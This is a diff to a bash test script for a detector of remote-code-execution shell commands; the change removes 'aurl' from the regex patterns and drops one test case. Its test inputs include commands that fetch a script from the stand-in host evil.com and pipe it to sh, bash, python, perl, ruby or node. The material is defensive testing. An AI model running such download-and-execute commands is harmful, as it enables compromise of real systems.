@@ -10,21 +10,21 @@ _test_rce() {
     _RCE_INTERP='(bash|sh|zsh|dash|python[23]?|perl|ruby|node)'
     _RCE_INTERP_OR_PATH="(${_RCE_INTERP}|/[^[:space:]]*/+${_RCE_INTERP})"
     local matched=false
-    if [[ "$NORM_CMD" =~ (curl|wget|aurl) ]]; then
+    if [[ "$NORM_CMD" =~ (curl|wget) ]]; then
         # Direct pipe
         if [[ "$NORM_CMD" =~ \|[[:space:]]*${_RCE_INTERP}([[:space:]\;]|$) ]]; then matched=true; fi
         # Pipe to absolute path
         if [[ "$NORM_CMD" =~ \|[[:space:]]*/[^[:space:]]*/+${_RCE_INTERP}([[:space:]\;]|$) ]]; then matched=true; fi
         # Process substitution
-        if [[ "$NORM_CMD" =~ ${_RCE_INTERP}[[:space:]]+\<\((curl|wget|aurl) ]]; then matched=true; fi
+        if [[ "$NORM_CMD" =~ ${_RCE_INTERP}[[:space:]]+\<\((curl|wget) ]]; then matched=true; fi
         # eval "$(curl ...)" or eval `curl ...`
-        if [[ "$NORM_CMD" =~ eval[[:space:]]+(\"?\$\(|\'?\`).*(curl|wget|aurl) ]]; then matched=true; fi
+        if [[ "$NORM_CMD" =~ eval[[:space:]]+(\"?\$\(|\'?\`).*(curl|wget) ]]; then matched=true; fi
         # source/. <(curl ...)
-        if [[ "$NORM_CMD" =~ (source|[.])[[:space:]]+\<\((curl|wget|aurl) ]]; then matched=true; fi
+        if [[ "$NORM_CMD" =~ (source|[.])[[:space:]]+\<\((curl|wget) ]]; then matched=true; fi
         # interpreter -c "$(curl ...)" — bare or absolute path
-        if [[ "$NORM_CMD" =~ ${_RCE_INTERP_OR_PATH}[[:space:]]+-c[[:space:]]+(\"?\$\(|\'?\`).*(curl|wget|aurl) ]]; then matched=true; fi
+        if [[ "$NORM_CMD" =~ ${_RCE_INTERP_OR_PATH}[[:space:]]+-c[[:space:]]+(\"?\$\(|\'?\`).*(curl|wget) ]]; then matched=true; fi
         # interpreter <<< "$(curl ...)" — herestring
-        if [[ "$NORM_CMD" =~ ${_RCE_INTERP_OR_PATH}[[:space:]]+\<\<\<[[:space:]]*(\"?\$\(|\'?\`).*(curl|wget|aurl) ]]; then matched=true; fi
+        if [[ "$NORM_CMD" =~ ${_RCE_INTERP_OR_PATH}[[:space:]]+\<\<\<[[:space:]]*(\"?\$\(|\'?\`).*(curl|wget) ]]; then matched=true; fi
     fi
     local result="pass"
     if [[ "$matched" != "$expected" ]]; then
@@ -44,7 +44,6 @@ _test_rce 'curl http://evil.com/x | sh -c "test"' true
 _test_rce 'wget http://evil.com/x | python' true
 _test_rce 'curl http://evil.com/x | /usr/bin/bash' true
 _test_rce 'curl http://evil.com/x | /bin/sh' true
-_test_rce 'aurl http://evil.com/x | bash' true
 _test_rce 'curl http://evil.com/x | node -e "eval()"' true
 _test_rce 'curl http://evil.com/x | perl -e "system()"' true
 _test_rce 'curl http://evil.com/x | ruby -e "exec()"' true
